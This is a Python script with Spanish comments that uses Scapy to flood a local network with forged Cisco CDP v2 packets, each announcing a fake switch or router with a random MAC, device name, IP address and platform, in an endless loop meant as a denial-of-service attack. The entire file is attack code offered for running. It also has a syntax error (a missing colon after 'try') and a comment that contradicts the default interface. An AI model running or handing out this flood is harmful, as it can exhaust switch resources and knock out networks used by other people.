#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
import random
import string
from scapy.all import *

# Cargamos el módulo de contribución de CDP de Scapy para soporte nativo
try
    load_contrib('cdp')
except Exception as e:
    print(f"[-] Error cargando el módulo de CDP de Scapy: {e}")
    sys.exit(1)

def generar_string_aleatorio(longitud=8):
    """Genera una cadena de caracteres aleatoria para nombres de dispositivos y puertos."""
    caracteres = string.ascii_letters + string.digits
    return ''.join(random.choice(caracteres) for _ in range(longitud))

def generar_ip_aleatoria():
    """Genera una dirección IP de prueba aleatoria."""
    return f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def cdp_dos_attack(interfaz):
    """
    Ejecuta la inundación de paquetes CDP con identidades de dispositivos y puertos aleatorios.
    La dirección MAC de destino de CDP siempre es la multicast oficial de Cisco: 01:00:0c:cc:cc:cc
    """
    print(f"[*] Iniciando ataque CDP DoS en la interfaz: {interfaz}")
    print("[*] Presiona Ctrl+C para detener la inundación de vecinos falsos.")
    
    contador = 0
    
    try:
        while True:
            # Generamos identidades de red completamente aleatorias
            mac_origen = RandMAC()
            id_dispositivo = f"SW_Falso_{generar_string_aleatorio(6)}"
            puerto_origen = f"GigabitEthernet{random.randint(0,9)}/{random.randint(0,24)}"
            ip_dispositivo = generar_ip_aleatoria()
            version_ios = "Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE4, RELEASE SOFTWARE (fc1)"
            plataforma = f"cisco WS-C2960-{random.randint(24,48)}TT-L"

            # Construimos la trama de Capa 2 con destino Multicast de Cisco
            ether = Ether(src=mac_origen, dst="01:00:0c:cc:cc:cc")
            
            # Encabezado LLC y SNAP requerido por CDP de Cisco
            llc = LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
            snap = SNAP(OUI=0x00000c, code=0x2000)
            
            # Construcción de los campos TLV (Type-Length-Value) nativos de CDP v2
            # 1. Device ID (Nombre del dispositivo)
            tlv_device_id = CDPMsgDeviceID(val=id_dispositivo)
            # 2. Address (Dirección IP de administración)
            tlv_address = CDPMsgAddr(addr=[CDPAddrRecordIPv4(addr=ip_dispositivo)])
            # 3. Port ID (Puerto desde donde supuestamente emite)
            tlv_port_id = CDPMsgPortID(val=puerto_origen)
            # 4. Capabilities (Capacidades: En este caso simulamos un Switch (0x02) y un Router (0x01) -> Total 0x21)
            tlv_capabilities = CDPMsgCapabilities(cap=0x21)
            # 5. Software Version
            tlv_software_version = CDPMsgSoftwareVersion(val=version_ios)
            # 6. Platform
            tlv_platform = CDPMsgPlatform(val=plataforma)

            # Ensamblado del paquete CDP v2
            cdp_packet = CDPv2_Packet(
                msg=[
                    tlv_device_id,
                    tlv_address,
                    tlv_port_id,
                    tlv_capabilities,
                    tlv_software_version,
                    tlv_platform
                ]
            )

            # Enviamos la trama completa a través del socket físico de capa 2
            sendp(ether / llc / snap / cdp_packet, iface=interfaz, verbose=False)
            
            contador += 1
            if contador % 100 == 0:
                print(f"[+] Enviados {contador} vecinos CDP falsos...")
            
            # Pequeño retraso controlado para no colapsar la CPU del atacante
            time.sleep(0.01)

    except KeyboardInterrupt:
        print(f"\n[-] Ataque detenido por el usuario. Total de paquetes inyectados: {contador}")
    except PermissionError:
        print("\n[-] Error: Se necesitan privilegios de superusuario (sudo) para enviar paquetes raw.")
    except Exception as e:
        print(f"\n[-] Error inesperado durante la ejecución: {e}")

if __name__ == "__main__":
    # Si no se define interfaz, por defecto usamos eth0 (interfaz clásica en Parrot)
    interfaz_objetivo = "ens33"
    
    if len(sys.argv) > 1:
        interfaz_objetivo = sys.argv[1]
        
    cdp_dos_attack(interfaz_objetivo)
